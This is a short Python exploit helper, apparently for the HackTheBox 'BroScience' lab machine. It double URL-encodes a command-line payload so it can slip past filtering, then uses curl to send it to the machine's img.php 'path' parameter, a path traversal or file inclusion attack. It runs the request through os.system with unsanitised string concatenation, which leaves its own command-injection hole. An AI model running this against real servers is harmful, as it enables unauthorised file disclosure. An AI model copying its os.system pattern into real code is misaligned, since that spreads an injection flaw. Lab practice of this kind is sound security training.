import sys
import os 
import urllib.parse

payload = sys.argv[1]
new_payload = urllib.parse.quote(payload, safe="")
new_payload = urllib.parse.quote(new_payload, safe="")

command = "curl -k -s 'https://broscience.htb/includes/img.php?path=" + new_payload + "'"
        
os.system(command)
